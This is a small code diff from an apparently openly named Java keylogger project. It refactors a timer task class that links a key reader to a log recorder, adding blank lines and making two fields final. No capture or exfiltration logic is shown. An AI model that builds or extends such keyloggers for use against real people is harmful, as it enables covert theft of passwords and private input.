@@ -2,13 +2,15 @@ package com.mossad.keylogger.timer;
 
 import com.mossad.keylogger.logging.LogRecorder;
 import com.mossad.keylogger.reader.KeyReader;
+
 import java.util.List;
 import java.util.TimerTask;
 
+
 public class WriterTask extends TimerTask {
 
-    private KeyReader keyReader;
-    private LogRecorder logRecorder;
+    private final KeyReader keyReader;
+    private final LogRecorder logRecorder;
 
     public WriterTask(KeyReader keyReader, LogRecorder logRecorder) {
         this.keyReader = keyReader;
